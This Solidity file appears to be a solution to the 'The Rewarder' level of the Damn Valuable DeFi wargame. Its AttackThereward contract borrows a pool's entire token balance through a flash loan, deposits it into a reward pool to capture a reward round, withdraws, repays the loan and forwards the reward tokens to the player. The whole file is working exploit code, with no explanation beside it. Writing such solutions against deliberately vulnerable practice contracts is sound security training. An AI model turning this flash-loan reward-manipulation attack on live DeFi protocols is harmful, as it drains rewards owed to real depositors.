// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import 'solmate/src/tokens/ERC20.sol';
import './TheRewarderPool.sol';
import './FlashLoanerPool.sol';
import '../DamnValuableToken.sol';
import './RewardToken.sol';

// interface IRewardToken {
//     function balanceOf(address account) external view returns (uint256);

//     function transfer(address to, uint256 amount) external returns (bool);
// }

contract AttackThereward {
    FlashLoanerPool immutable flashLoanerPool;
    TheRewarderPool immutable theRewarderPool;
    DamnValuableToken immutable liquidityToken;
    RewardToken immutable rewardToken;
    address immutable player;

    constructor(
        FlashLoanerPool _flashLoanerPool,
        TheRewarderPool _theRewarderPool,
        DamnValuableToken _liquidityToken,
        address _player,
        RewardToken _rewardToken
    ) {
        flashLoanerPool = _flashLoanerPool;
        theRewarderPool = _theRewarderPool;
        liquidityToken = _liquidityToken;
        player = _player;
        rewardToken = _rewardToken;
    }

    function attack() external {
        flashLoanerPool.flashLoan(
            liquidityToken.balanceOf(address(flashLoanerPool))
        );
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
    }
}
